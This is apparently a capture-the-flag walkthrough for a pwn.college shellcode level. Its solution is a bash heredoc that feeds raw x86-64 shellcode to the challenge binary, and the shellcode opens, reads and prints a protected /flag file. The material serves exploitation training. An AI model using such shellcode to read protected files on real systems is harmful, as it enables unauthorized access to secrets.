# Stage 15: Basic Shellcode — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | — |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-basic-shellcode` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-basic-shellcode`. Raw x86-64 shellcode is written to the binary's stdin: it opens `/flag`, reads its contents, and writes them back to stdout. The shellcode is emitted verbatim through a heredoc.

## Solution

```bash
python3 << 'EOF' | /challenge/binary-exploitation-basic-shellcode
import sys

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x66\x6c\x61\x67\x00\x00\x00\x57\x54\x5f\x6a\x02\x58\x99\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x31\xd2\x66\xba\x00\x01\x48\x31\xc0\x0f\x05\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x0f\x05"

sys.stdout.buffer.write(shellcode)
EOF
```
